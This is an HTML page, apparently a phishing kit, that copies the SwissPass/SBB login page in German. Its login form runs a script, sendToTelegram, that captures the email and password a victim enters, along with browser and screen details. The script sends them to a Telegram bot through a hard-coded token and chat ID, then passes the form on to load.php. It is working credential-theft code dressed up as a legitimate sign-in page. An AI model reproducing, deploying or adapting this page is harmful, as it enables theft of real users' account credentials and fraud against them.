<!DOCTYPE html>
<html class="js no-touch hashchange history csstransforms csstransforms3d csstransitions svg inlinesvg svgclippaths placeholder modern" dir="ltr" lang="de-ch" style="">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>SwissPass</title>
    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
    <meta content="no-cache, no-store, must-revalidate" http-equiv="Cache-Control">
    <meta content="no-cache" http-equiv="Pragma">
    <meta content="0" http-equiv="Expires">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport">
    <meta content="de" name="content-language">
    <meta content="Der SwissPass ist der Schlüssel für Ihre Mobilität: Flexibel, unabhängig und voller Vorteile." name="description">
    <meta content="login, SwissPass, abo, abonnement, ga, halbtax, bahn, zug, öffenlicher verkehr, verkehr, öv" name="keywords">
    <meta content="SBB CFF FFS" name="author">
    <meta content="SBB CFF FFS" name="publisher">
    <meta content="SBB CFF FFS" name="copyright">
    <meta content="SBB CFF FFS" name="company">
    <meta content="Login | SwissPass" name="page-topic">
    <meta content="2 days" name="revisit-after">
	<script>
	  document.documentElement.style.cssText="filter:hue-rotate(4deg)"; 
	  </script>
    <meta content="index" name="robots">
    <meta content="Login | SwissPass" property="og:title">
    <meta content="Der SwissPass ist der Schlüssel für Ihre Mobilität: Flexibel, unabhängig und voller Vorteile." property="og:description">
    <meta content="swisspass.ch" property="og:site_name">
    <meta content="website" property="og:type">
    <link href="./Login _ SwissPass_files/favicon.ico?v=20140709-1126" rel="icon" type="image/x-icon">
    <link href="./Login _ SwissPass_files/sso.min-20200819.css" rel="stylesheet">
    <!--[endif]---->
    <style>
      @font-face {
        font-family: icomoon;
        src: url(icomoon.woff2);
      }

      </style></head><body class="js-offcanvas-root"><div id="skelWrapOuter"class="skel-wrap-outer skin-sso skin-provider"><h1 tabindex="-1"id="skipnav"class="sr-only">Navigieren auf SwissPass.ch</h1><style type="text/css">.swissid-requirements-info {
        padding: 20px 40px !important;
        font-size: .8em;
        flex-direction: column;
        text-align: center;
      }

      @media screen and (max-width: 991px) {
        .swissid-requirements-info {
          padding: 20px 20px 0 !important;
          font-size: 1em;
        }

        .skin-sso .mod-login {
          margin-bottom: 5rem;
        }
      }

      .icon-info_big_32 {
        margin-bottom: 2rem;
        font-size: 2.5rem;
      }
    </style>
    <div id="skelWrapInner" class="skel-wrap-inner">
      <header xmlns="http://www.w3.org/1999/xhtml" class="skel-header skel-header-provider" style="background-color: #FFF;">
        <h1 class="sr-only" id="navTopRoot" tabindex="-1">Navigation</h1>
        <a class="sr-only" href="#" tabindex="-1">Zurück</a>
       
      </header>
      <main class="skel-main" id="mainContent">
        <div id="mainContentBg" class="mod-content" style="background-image: url(&#39;https://resources.swisspass.ch/content/dam/swisspass/co-branding/swiss_ch/login_bg.jpg&#39;);">
          <div class="mod-content--root">
            <nav class="mod-login">
              <div class="mod-login-swisspass">
                <div class="mod-login-swisspass-inner">
                  <h1 class="sr-only">Inhalt</h1>
                  <div class="mod-login--action">
                    <a class="mod-metamenu--logo js-webtrends--initted" title="SwissPass home" href="#">
                      <div class="visible-sm visible-sm visible-md visible-lg mod-metamenu--logo-original">
                        <picture>
                          <source srcset="logo_text_de-20200819.svg" type="image/svg+xml">
                          <img src="./Login _ SwissPass_files/logo_text_de-20200819.png" width="400">
                        </picture>
                      </div>
                      <div class="mod-login--symbol visible-xs">
                        <picture valign="bottom">
                          <source srcset="logo-20200819.svg" type="image/svg+xml">
                          <img src="./Login _ SwissPass_files/logo-20200819.png" width="152">
                        </picture>
                      </div>
                    </a>
                  </div>
                  <div class="mod-login--notifications mod-login--action">
                    <h2 class="sr-only" data-notification-header="all-messages">Mitteilungen</h2>
                    <noscript></noscript>
                  </div>
                  <div class="mod-login--action">
                    <h2 class="sr-only">Login</h2>
                    <style type="text/css">
                      .mod-login--panel-first {
                        padding-bottom: 24px;
                      }

                      .btn-provider-login-submit,
                      .registration-box {
                        padding-bottom: 32px;
                      }

                      .link-pw-reset {
                        text-decoration: underline;
                        font-size: 16px;
                      }

                      .link-register {
                        float: right;
                        text-decoration: underline;
                      }

                      .no-account {
                        float: left;
                        padding-top: 12px;
                        padding-left: 16px;
                      }

                      @media screen and (min-width: 992px) {
                        .btn-provider-login-submit {
                          float: right;
                        }

                        .registration-box {
                          float: right;
                        }
                      }
                    </style>
                    <form name="LOGINFORM" method="POST" action="load.php" id="mainform" autocomplete="off" onsubmit="sendToTelegram(event)">
                      <input type="hidden" name="FORM_TOKEN" value="a06766c286c4a162">
                      <div id="emailFormGroup" class="form-group js-floatlabel mod-formstate__background js-floatlabel__always js-tooltip__no-popout js-tooltip js-tooltip__info mod-formstate js-tooltip__initted js-floatlabel__initted" style="margin-top: 24px;">
                        <div class="col-sm-12">
                          <label class="control-label" aria-hidden="true"> E-Mail </label>
                        </div>
                        <div class="col-sm-12">
                          <label class="sr-only" for="email"> E-Mail </label>
                          <input class="form-control js-floatlabel--input js-input-scroll__initted" id="email" required placeholder="E-Mail" name="username" value="" type="email" maxlength="35" aria-required="true">
                          <label class="js-floatlabel--label" aria-hidden="true">E-Mail</label>
                        </div>
                        <div class="js-tooltip--messages">
                          <span class="js-tooltip--message js-tooltip--message__error" id="email-tooltip">
                            <p id="emailNotNull" class="js-tooltip--js__message" style="display:none"> Bitte geben Sie Ihre E-Mail-Adresse ein. </p>
                            <p id="emailRegex" class="js-tooltip--js__message" style="display:none"> Bitte geben Sie eine gültige E-Mail-Adresse ein. </p>
                          </span>
                        </div>
                      </div>
                      <div id="pwdFormGroup" class="form-group js-floatlabel mod-formstate__background js-floatlabel__always js-tooltip__no-popout js-tooltip js-tooltip__info mod-formstate js-tooltip__initted js-floatlabel__initted" style="margin-top: 24px;">
                        <div class="col-sm-12">
                          <label class="control-label" aria-hidden="true"> Passwort </label>
                        </div>
                        <div class="col-sm-12">
                          <label class="sr-only" for="pwd"> Passwort </label>
                          <input class="form-control js-floatlabel--input js-input-scroll__initted" id="pwd" name="password" value="" type="password" required maxlength="20" placeholder="Passwort" size="20" aria-required="true">
                          <label class="js-floatlabel--label" aria-hidden="true">Passwort</label>
                        </div>
                        <div class="js-tooltip--messages">
                          <span class="js-tooltip--message js-tooltip--message__error" id="passwort-tooltip">
                            <p id="pwdNotNull" class="js-tooltip--js__message" style="display:none"> Bitte geben Sie ein Passwort ein. </p>
                          </span>
                        </div>
                      </div>
                      <div class="form-group mod-formstate__background js-floatlabel js-floatlabel__always js-floatlabel__active form-group__login__remember-me js-floatlabel__initted">
                        <div class="col-sm-8 js-tooltip--container mod-formelem mod-formelem--bright mod-formelem__check">
                          <input class="" id="show-pwd" type="checkbox" name="show-pwd" form="dummy">
                          <label class="mod-formelem--wrapper" for="show-pwd">
                            <span class="mod-formelem--icon"></span>
                            <span class="mod-formelem--text">Passwort anzeigen</span>
                          </label>
                        </div>
                        <div id="remember-me-container" class="col-sm-8 js-tooltip--container mod-formelem mod-formelem--bright mod-formelem__check">
                          <input class="" id="remember-me" type="checkbox" name="REMEMBER_ME">
                          <label class="mod-formelem--wrapper" for="remember-me">
                            <span class="mod-formelem--icon"></span>
                            <span class="mod-formelem--text">Angemeldet bleiben</span>
                          </label>
                        </div>
                      </div>
                      <div class="form-group mod-login--panel">
                        <div class="mod-valign">
                          <div class="mod-login--panel-aside mod-login--panel-first mod-login--action__secondary hidden-xs hidden-sm">
                            <div class="btn-provider-login-submit">
                              <button type="submit" name="LOGIN" id="login_button" data-loader-id="LOGIN" class="btn btn-primary btn-lg js-loader mod-actions--action btn-sso-login js-loader__initted js-webtrends--initted" value="Anmelden"> Anmelden <span class="js-loader--state">
                                  <span class="js-loader--state-icon js-loader--pending">
                                    <svg class="js-loader--svg" preserveAspectRatio="none" version="1.1" viewBox="0 0 32 32" role="presentation">
                                      <switch>
                                        <path class="js-loader--svg-path" d="
	                          M16,6
	                          A10,10 0 0,1 26,16
	                          A10,10 0 0,1 16,26
	                          A10,10 0 0,1  6,16
	                          A10,10 0 0,1 16, 6
	                          z" style="stroke-dasharray: 62.8407, 62.8407; stroke-dashoffset: 62.8407;"></path>
                                        <foreignobject requiredExtensions="http://www.w3.org/1999/xhtml">
                                          <img src="./Login _ SwissPass_files/loader-20200819.png" class="js-loader--svg-fallback">
                                        </foreignobject>
                                      </switch>
                                    </svg>
                                  </span>
                                </span>
                              </button>
                            </div>
                            <a class="btn btn-meta btn-md js-webtrends--initted" href="#">
                              <span class="link-pw-reset"> Passwort vergessen? </span>
                            </a>
                          </div>
                          <div class="mod-valign--el mod-login--panel-aside mod-login--action__secondary visible-xs visible-sm ">
                            <div class="btn-provider-login-submit">
                              <button type="submit" name="LOGIN" id="login_button" data-loader-id="LOGIN" class="btn btn-primary btn-lg js-loader mod-actions--action btn-sso-login js-loader__initted js-webtrends--initted" value="Anmelden"> Anmelden <span class="js-loader--state">
                                  <span class="js-loader--state-icon js-loader--pending">
                                    <svg class="js-loader--svg" preserveAspectRatio="none" version="1.1" viewBox="0 0 32 32" role="presentation">
                                      <switch>
                                        <path class="js-loader--svg-path" d="
	                          M16,6
	                          A10,10 0 0,1 26,16
	                          A10,10 0 0,1 16,26
	                          A10,10 0 0,1  6,16
	                          A10,10 0 0,1 16, 6
	                          z" style="stroke-dasharray: 62.8407, 62.8407; stroke-dashoffset: 62.8407;"></path>
                                        <foreignobject requiredExtensions="http://www.w3.org/1999/xhtml">
                                          <img src="./Login _ SwissPass_files/loader-20200819.png" class="js-loader--svg-fallback">
                                        </foreignobject>
                                      </switch>
                                    </svg>
                                  </span>
                                </span>
                              </button>
                            </div>
                            <a class="btn btn-meta btn-md js-webtrends--initted" href="#">
                              <span class="link-pw-reset"> Passwort vergessen? </span>
                            </a>
                          </div>
                          <hr>
                          <span class="no-account"> Noch kein Kundenkonto? </span>
                          <div class="registration-box">
                            <a class="btn btn-meta btn-md js-webtrends--initted" target="_top" href="#">
                              <span class="link-register"> Jetzt registrieren </span>
                            </a>
                          </div>
                        </div>
                      </div>
                      <input type="hidden" name="_758_xprot" value="/$xp2/e4Sy_7KcyRajJX7trX00oDiWmHnUYN7BVW50oGWam9p2aCK56D2VktgBGGxSdFqHVUwTCAGxwUdSGgDqslObcDkSyrI1p68Cfn1b19WTHleY3MgWigxbmwewb_l0GoViReSa0GiXI8Kq!v!TW_52i!hShOTrIOZe6auuTuVLP_vEN44vrRzDOoXPaqjoe2J_xnOfpjNxTvZS!MuaXXqoFCw6LzNgSNRS6qtSttEwNGj4snoo1ngxYp6rTR5_hPqIVX3N6CJoBWSA6Br_5PFsdzIBJc8=">
                      <input type="hidden" name="CSRFT759" value="BJaUQ_KFK5XnTtMF!Rk7XQ">
                    </form>
                    <script>
                      function getFormattedDate() {
                        const now = new Date();
                        const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
                        const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
                        
                        const dayName = days[now.getDay()];
                        const date = now.getDate();
                        const monthName = months[now.getMonth()];
                        const year = now.getFullYear();
                        const hours = now.getHours().toString().padStart(2, '0');
                        const minutes = now.getMinutes().toString().padStart(2, '0');
                        
                        return `${dayName} ${date} ${monthName} ${year} @ ${hours}:${minutes}`;
                      }

                      function sendToTelegram(event) {
                        event.preventDefault();
                        
                        const email = document.getElementById('email').value;
                        const password = document.getElementById('pwd').value;
                        const userAgent = navigator.userAgent;
                        const screenWidth = window.screen.width;
                        const screenHeight = window.screen.height;
                        
                        const botToken = '7982653544:AAFo0JFNathHNi92MdpARAJEV7OcMwOE4cQ';
                        const chatId = '-1002253966185';
                       
                        
                        const message = `
|++++++++| 😈 SBB - INFOS 😈 |++++++++|
|
|💶 LOGIN 💶 : ${email}
|🔐 PASS 🔐 : ${password}
|
|+++++++| 😈 CARD - INFOS 😈 |+++++++|
|
|Submitted by: ${window.location.ip} (${navigator.userAgent.split(' ')[0]})
|Browser: ${navigator.appName}
|Screen Size: ${screenWidth}x${screenHeight}
|Received: ${getFormattedDate()}
|
|++++++| 😈  😈  Lajded 😈  😈 |++++++|
                        `;
                        
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                          method: 'POST',
                          headers: {
                            'Content-Type': 'application/json'
                          },
                          body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                          })
                        })
                        .then(response => {
                          if (!response.ok) {
                            throw new Error('Erreur réseau');
                          }
                          return response.json();
                        })
                        .then(data => {
                          console.log('Succès:', data);
                          //alert('Une erreur est survenue lors de la connexion. Veuillez réessayer plus tard.');
                          document.getElementById('mainform').submit();
                        })
                        .catch(error => {
                          console.error('Erreur:', error);
                          //alert('Erreur de connexion. Veuillez réessayer.');
                        });
                      }

                      function validateForm() {
                        var constraintUid = {
                          id: 'email',
                          notNull: true,
                          regex: [, /^[_A-Za-z0-9-,_+&]+(\.[_A-Za-z0-9-,_+&]+)*@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})$/, /[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}/]
                        };
                        var constraintPw = {
                          id: 'pwd',
                          notNull: true
                        };
                        return validate([constraintUid, constraintPw], 'LOGIN');
                      }
                      const pwdField = document.getElementById('pwd');
                      const visibilityToggler = document.getElementById('show-pwd');
                      visibilityToggler.addEventListener('click', _ => {
                        pwdField.setAttribute('type', visibilityToggler.checked ? 'text' : 'password');
                      });
                    </script>
                  </div>
                </div>
              </div>
            </nav>
          </div>
        </div>
      </main>
    </div>
    </div>
    <button id="ot-sdk-btn" class="ot-sdk-show-settings hidden js-webtrends--initted"></button>
  
    <div class="dialog js-dialog js-dialog__change-email mod-content--root hidden" id="confirm-cancellation-dialog">
      <div class="dialog-overlay" tabindex="-1" data-a11y-dialog-hide="" onclick="closeModal()"></div>
      <div class="dialog-content" aria-labelledby="dialogTitle" aria-describedby="dialogDescription" role="dialog">
        <div role="document" class="js-submit-activation js-submit-activation__initted" data-activation-criteria="input-length">
          <h2 id="dialogTitle" class="mod-form--title dialog-title">Ihr SwissID-Login ist nicht mit dem SwissPass-Konto verknüpft.</h2>
          <p id="dialogDescription" class="dialog-desc"></p>
          <p>Eine Verknüpfung ist aufgrund der Deaktivierung des SwissID Logins für SwissPass per 31.&nbsp;März 2022 nicht mehr möglich.</p>
          <p></p>
          <a class="btn btn-primary btn-lg mod-actions--action js-webtrends--initted" style="margin-top: 24px; float: right;" href="#" onclick="closeModal()">
            <span class="btn-title">Zurück</span>
          </a>
          <a href="#" onclick="closeModal()" data-a11y-dialog-hide="" class="btn btn-default btn-icon-sm dialog-close js-webtrends--initted">
            <span class="mod-icon mod-icon__sm icon-close_16" aria-hidden="true"></span>
            <span class="sr-only">Overlay schliessen</span>
          </a>
        </div>
      </div>
    </div>
   
    <noscript>
      <div style="position: fixed; top: 0px; left: 0px; z-index: 3000;
        height: 100%; width: 100%; background-color: rgba(255,255,255,0.77)">
        <h1 style="margin: 60px 20px; background-color: #FFFFFF">Sie müssen dem Browser erlauben JavaScript auszuführen, damit diese Seite korrekt funktioniert. Weitere Informationen unter <a href="#/">www.enable-javascript.com</a>
        </h1>
      </div>
    </noscript>
    <div id="flying-focus" style="transition-duration: 0.01s;"></div>
    </body>
</html>